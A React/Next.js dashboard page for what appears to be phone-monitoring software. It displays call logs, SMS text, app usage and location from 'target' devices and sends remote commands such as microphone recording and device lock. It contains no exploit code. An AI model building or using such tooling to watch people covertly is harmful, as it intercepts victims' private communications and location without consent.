
"use client";

import { useUser, useCollection, useFirestore } from "@/firebase";
import { useRouter } from "next/navigation";
import { useEffect, useMemo, useState } from "react";
import { collection, query, where, orderBy, limit, addDoc } from "firebase/firestore";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Progress } from "@/components/ui/progress";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { 
  Smartphone, Phone, MessageSquare, Play, Loader2, RefreshCw, 
  Map as MapIcon, Activity, Cpu, Signal, Zap, Lock, Mic
} from "lucide-react";
import { format } from "date-fns";
import { Navbar } from "@/components/Navbar";
import { isFirebaseConfigValid } from "@/firebase/config";
import { toast } from "@/hooks/use-toast";

export default function AdvancedDashboard() {
  const { user, loading: authLoading } = useUser();
  const db = useFirestore();
  const router = useRouter();
  const [selectedDeviceId, setSelectedDeviceId] = useState<string | null>(null);
  
  const isSimulation = !isFirebaseConfigValid();

  useEffect(() => {
    if (!authLoading && !user) router.push("/login");
  }, [user, authLoading, router]);

  const devicesQuery = useMemo(() => {
    if (!db || !user || isSimulation) return null;
    try {
      return query(collection(db, "devices"), where("userId", "==", user.uid));
    } catch (e) {
      return null;
    }
  }, [db, user, isSimulation]);

  const { data: devices, loading: devicesLoading } = useCollection(devicesQuery);

  // Mock data for simulation mode
  const mockDevices = useMemo(() => [
    { id: "mock-1", name: "John's iPhone 15", batteryLevel: 84, isOnline: true, model: "iPhone 15 Pro", osVersion: "iOS 17.4" },
    { id: "mock-2", name: "Sarah's Galaxy S24", batteryLevel: 12, isOnline: false, model: "SM-G991B", osVersion: "Android 14" }
  ], []);

  const activeDevices = isSimulation ? mockDevices : (devices || []);

  useEffect(() => {
    if (activeDevices.length > 0 && !selectedDeviceId) {
      setSelectedDeviceId(activeDevices[0].id);
    }
  }, [activeDevices, selectedDeviceId]);

  const currentDevice = useMemo(() => {
    return activeDevices.find(d => d.id === selectedDeviceId);
  }, [activeDevices, selectedDeviceId]);

  const telemetryQueries = useMemo(() => {
    if (!db || !selectedDeviceId || isSimulation) return { calls: null, sms: null, usage: null };
    try {
      return {
        calls: query(collection(db, "devices", selectedDeviceId, "calls"), orderBy("timestamp", "desc"), limit(10)),
        sms: query(collection(db, "devices", selectedDeviceId, "sms"), orderBy("timestamp", "desc"), limit(10)),
        usage: query(collection(db, "devices", selectedDeviceId, "usage"), orderBy("timestamp", "desc"), limit(10))
      };
    } catch (e) {
      return { calls: null, sms: null, usage: null };
    }
  }, [db, selectedDeviceId, isSimulation]);

  const { data: calls } = useCollection(telemetryQueries.calls);
  const { data: sms } = useCollection(telemetryQueries.sms);
  const { data: usage } = useCollection(telemetryQueries.usage);

  // Mock Telemetry for Simulation
  const mockCalls = [{ id: "c1", contactName: "David Miller", type: "INCOMING", duration: 124, timestamp: new Date().toISOString() }];
  const mockSms = [{ id: "s1", address: "WhatsApp", body: "Checking in on the project status.", timestamp: new Date().toISOString() }];
  const mockUsage = [{ id: "u1", appName: "Snapchat", packageName: "com.snapchat.android", durationSeconds: 3600 }];

  const activeCalls = isSimulation ? mockCalls : (calls || []);
  const activeSms = isSimulation ? mockSms : (sms || []);
  const activeUsage = isSimulation ? mockUsage : (usage || []);

  async function sendRemoteCommand(commandType: string) {
    if (isSimulation) {
      toast({ title: "Simulation Command", description: `${commandType} triggered in sandbox.` });
      return;
    }
    if (!db || !selectedDeviceId) return;
    try {
      await addDoc(collection(db, "devices", selectedDeviceId, "commands"), {
        type: commandType,
        status: "PENDING",
        createdAt: new Date().toISOString(),
        payload: {}
      });
      toast({ title: "Command Queued", description: `${commandType} sent to device.` });
    } catch (e) {
      toast({ variant: "destructive", title: "Error", description: "Failed to send command." });
    }
  }

  if (authLoading || (devicesLoading && !isSimulation)) {
    return <div className="min-h-screen flex items-center justify-center bg-background"><Loader2 className="w-10 h-10 animate-spin text-primary" /></div>;
  }

  return (
    <div className="min-h-screen bg-[#050505]">
      <Navbar />
      
      <main className="pt-24 pb-12 px-6 lg:px-12 max-w-[1600px] mx-auto space-y-8">
        <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
          <Card className="bg-zinc-900/50 border-white/5 p-4 flex items-center gap-4">
            <div className="w-12 h-12 rounded-2xl bg-primary/10 flex items-center justify-center">
              <Smartphone className="w-6 h-6 text-primary" />
            </div>
            <div>
              <p className="text-[10px] text-muted-foreground uppercase font-black tracking-widest">Active Devices</p>
              <p className="text-2xl font-bold text-white">{activeDevices.length}</p>
            </div>
          </Card>
          <Card className="bg-zinc-900/50 border-white/5 p-4 flex items-center gap-4">
            <div className="w-12 h-12 rounded-2xl bg-green-500/10 flex items-center justify-center">
              <Signal className="w-6 h-6 text-green-500" />
            </div>
            <div>
              <p className="text-[10px] text-muted-foreground uppercase font-black tracking-widest">Global Status</p>
              <p className="text-2xl font-bold text-white">{isSimulation ? 'Sandbox' : 'Encrypted'}</p>
            </div>
          </Card>
          <Card className="bg-zinc-900/50 border-white/5 p-4 flex items-center gap-4">
            <div className="w-12 h-12 rounded-2xl bg-blue-500/10 flex items-center justify-center">
              <Activity className="w-6 h-6 text-blue-500" />
            </div>
            <div>
              <p className="text-[10px] text-muted-foreground uppercase font-black tracking-widest">Events Today</p>
              <p className="text-2xl font-bold text-white">128</p>
            </div>
          </Card>
          <Card className="bg-zinc-900/50 border-white/5 p-4 flex items-center gap-4">
            <div className="w-12 h-12 rounded-2xl bg-yellow-500/10 flex items-center justify-center">
              <Zap className="w-6 h-6 text-yellow-500" />
            </div>
            <div>
              <p className="text-[10px] text-muted-foreground uppercase font-black tracking-widest">AI Readiness</p>
              <p className="text-2xl font-bold text-white">98%</p>
            </div>
          </Card>
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-12 gap-8">
          <div className="lg:col-span-3 space-y-6">
            <div className="space-y-3">
              <h3 className="text-[10px] font-black text-muted-foreground uppercase tracking-widest px-2">Device Fleet</h3>
              {activeDevices.map(device => (
                <button
                  key={device.id}
                  onClick={() => setSelectedDeviceId(device.id)}
                  className={`w-full text-left p-4 rounded-2xl border transition-all ${
                    selectedDeviceId === device.id 
                    ? "bg-primary/10 border-primary/50 shadow-lg shadow-primary/5" 
                    : "bg-zinc-900/30 border-white/5 hover:border-white/10"
                  }`}
                >
                  <div className="flex items-center gap-3">
                    <div className={`w-10 h-10 rounded-xl flex items-center justify-center ${selectedDeviceId === device.id ? 'bg-primary text-white' : 'bg-zinc-800 text-zinc-500'}`}>
                      <Smartphone className="w-5 h-5" />
                    </div>
                    <div className="flex-1 overflow-hidden">
                      <p className="font-bold text-white truncate text-sm">{device.name}</p>
                      <p className="text-[10px] text-muted-foreground font-medium">{device.isOnline ? 'Active Now' : 'Offline'}</p>
                    </div>
                  </div>
                </button>
              ))}
            </div>

            {currentDevice && (
              <div className="space-y-4 pt-4 border-t border-white/5">
                <h3 className="text-[10px] font-black text-muted-foreground uppercase tracking-widest px-2">Remote Cockpit</h3>
                <div className="grid grid-cols-2 gap-2">
                  <Button variant="outline" size="sm" className="bg-zinc-900 border-white/5 text-[10px] font-bold py-6 rounded-xl" onClick={() => sendRemoteCommand('SYNC_NOW')}>
                    <RefreshCw className="w-3 h-3 mr-2 text-blue-400" /> REFRESH
                  </Button>
                  <Button variant="outline" size="sm" className="bg-zinc-900 border-white/5 text-[10px] font-bold py-6 rounded-xl" onClick={() => sendRemoteCommand('RECORD_AUDIO')}>
                    <Mic className="w-3 h-3 mr-2 text-green-400" /> RECORD
                  </Button>
                  <Button variant="outline" size="sm" className="bg-zinc-900 border-white/5 text-[10px] font-bold py-6 rounded-xl" onClick={() => sendRemoteCommand('LOCK_DEVICE')}>
                    <Lock className="w-3 h-3 mr-2 text-red-400" /> LOCK
                  </Button>
                  <Button variant="outline" size="sm" className="bg-zinc-900 border-white/5 text-[10px] font-bold py-6 rounded-xl" onClick={() => sendRemoteCommand('PING')}>
                    <Signal className="w-3 h-3 mr-2 text-yellow-400" /> PING
                  </Button>
                </div>
              </div>
            )}
          </div>

          <div className="lg:col-span-9 space-y-8">
            {currentDevice ? (
              <>
                <div className="grid grid-cols-1 xl:grid-cols-3 gap-6">
                  <Card className="bg-zinc-900/50 border-white/5 rounded-3xl overflow-hidden xl:col-span-1">
                    <div className="p-4 border-b border-white/5 bg-white/5">
                      <h4 className="text-sm font-black uppercase tracking-widest">Device Vitals</h4>
                    </div>
                    <CardContent className="p-6 space-y-6">
                      <div className="space-y-2">
                        <div className="flex justify-between text-xs font-bold">
                          <span className="text-muted-foreground">Battery Level</span>
                          <span className="text-white">{currentDevice.batteryLevel}%</span>
                        </div>
                        <Progress value={currentDevice.batteryLevel} className="h-2 bg-zinc-800" />
                      </div>
                      <div className="grid grid-cols-2 gap-4">
                        <div className="bg-white/5 p-3 rounded-2xl border border-white/5">
                          <p className="text-[10px] text-muted-foreground font-bold uppercase mb-1">Network</p>
                          <p className="text-xs font-black text-white">4G LTE</p>
                        </div>
                        <div className="bg-white/5 p-3 rounded-2xl border border-white/5">
                          <p className="text-[10px] text-muted-foreground font-bold uppercase mb-1">Status</p>
                          <p className="text-xs font-black text-white">{currentDevice.isOnline ? 'Online' : 'Offline'}</p>
                        </div>
                      </div>
                    </CardContent>
                  </Card>

                  <Card className="bg-zinc-900/50 border-white/5 rounded-3xl overflow-hidden xl:col-span-2 min-h-[250px] relative">
                    <div className="absolute inset-0 bg-[#111] opacity-50" style={{ backgroundImage: 'radial-gradient(circle at 2px 2px, #333 1px, transparent 0)', backgroundSize: '24px 24px' }} />
                    <div className="absolute inset-0 flex items-center justify-center">
                      <div className="text-center space-y-4 z-10">
                        <div className="w-16 h-16 bg-primary/20 rounded-full flex items-center justify-center mx-auto border border-primary/30 animate-pulse">
                          <MapIcon className="w-8 h-8 text-primary" />
                        </div>
                        <div className="space-y-1">
                          <p className="text-lg font-black text-white">Live Tracking Active</p>
                          <p className="text-xs text-muted-foreground">Coordinates: 40.7128° N, 74.0060° W</p>
                        </div>
                        <Button variant="secondary" className="rounded-full font-bold text-xs h-9 px-6">Open High-Res Map</Button>
                      </div>
                    </div>
                  </Card>
                </div>

                <Card className="bg-zinc-900/50 border-white/5 rounded-[2.5rem] overflow-hidden">
                  <Tabs defaultValue="calls" className="w-full">
                    <TabsList className="w-full justify-start h-16 bg-white/5 border-b border-white/5 rounded-none px-8 gap-10">
                      <TabsTrigger value="calls" className="data-[state=active]:bg-transparent data-[state=active]:text-primary data-[state=active]:border-b-2 data-[state=active]:border-primary rounded-none px-0 text-xs font-black uppercase tracking-widest">Call Logs</TabsTrigger>
                      <TabsTrigger value="sms" className="data-[state=active]:bg-transparent data-[state=active]:text-primary data-[state=active]:border-b-2 data-[state=active]:border-primary rounded-none px-0 text-xs font-black uppercase tracking-widest">SMS Center</TabsTrigger>
                      <TabsTrigger value="usage" className="data-[state=active]:bg-transparent data-[state=active]:text-primary data-[state=active]:border-b-2 data-[state=active]:border-primary rounded-none px-0 text-xs font-black uppercase tracking-widest">App Usage</TabsTrigger>
                    </TabsList>

                    <TabsContent value="calls" className="m-0 p-0">
                      <div className="divide-y divide-white/5">
                        {activeCalls.map((call: any) => (
                          <div key={call.id} className="p-6 flex items-center justify-between hover:bg-white/5 transition-colors">
                            <div className="flex items-center gap-6">
                              <div className={`w-10 h-10 rounded-full flex items-center justify-center ${call.type === 'MISSED' ? 'bg-red-500/10 text-red-500' : 'bg-green-500/10 text-green-500'}`}>
                                <Phone className="w-5 h-5" />
                              </div>
                              <div>
                                <p className="font-bold text-white text-base">{call.contactName || call.phoneNumber}</p>
                                <p className="text-[10px] text-muted-foreground font-bold uppercase tracking-widest">
                                  {format(new Date(call.timestamp), "MMM d, HH:mm")} • {call.duration}s
                                </p>
                              </div>
                            </div>
                            <Button variant="ghost" size="icon" className="text-zinc-500 hover:text-primary">
                              <Play className="w-4 h-4" />
                            </Button>
                          </div>
                        ))}
                      </div>
                    </TabsContent>

                    <TabsContent value="sms" className="m-0 p-0">
                      <div className="divide-y divide-white/5">
                        {activeSms.map((msg: any) => (
                          <div key={msg.id} className="p-6 flex gap-4 hover:bg-white/5 transition-colors">
                            <div className="w-10 h-10 rounded-full bg-blue-500/10 text-blue-500 flex items-center justify-center shrink-0">
                              <MessageSquare className="w-5 h-5" />
                            </div>
                            <div className="flex-1 space-y-1">
                              <div className="flex justify-between">
                                <p className="font-bold text-sm text-blue-400">{msg.address}</p>
                                <p className="text-[10px] text-muted-foreground font-black uppercase">{format(new Date(msg.timestamp), "HH:mm")}</p>
                              </div>
                              <p className="text-sm text-zinc-400 line-clamp-2 leading-relaxed">"{msg.body}"</p>
                            </div>
                          </div>
                        ))}
                      </div>
                    </TabsContent>

                    <TabsContent value="usage" className="m-0 p-0">
                       <div className="divide-y divide-white/5">
                        {activeUsage.map((item: any) => (
                          <div key={item.id} className="p-6 flex items-center justify-between hover:bg-white/5 transition-colors">
                            <div className="flex items-center gap-4">
                              <div className="w-10 h-10 rounded-xl bg-zinc-800 flex items-center justify-center">
                                <Cpu className="w-5 h-5 text-zinc-400" />
                              </div>
                              <div>
                                <p className="font-bold text-white text-sm">{item.appName}</p>
                                <p className="text-[10px] text-muted-foreground">{item.packageName}</p>
                              </div>
                            </div>
                            <div className="text-right">
                              <p className="text-xs font-black text-white">{Math.floor(item.durationSeconds / 60)}m active</p>
                              <p className="text-[9px] text-muted-foreground uppercase font-bold tracking-widest">Daily Usage</p>
                            </div>
                          </div>
                        ))}
                      </div>
                    </TabsContent>
                  </Tabs>
                </Card>
              </>
            ) : (
              <div className="h-[600px] flex items-center justify-center bg-zinc-900/20 border border-white/5 rounded-[3.5rem] text-zinc-600 font-bold uppercase tracking-widest italic">
                Select a target device to initiate telemetry handshake.
              </div>
            )}
          </div>
        </div>
      </main>
    </div>
  );
}
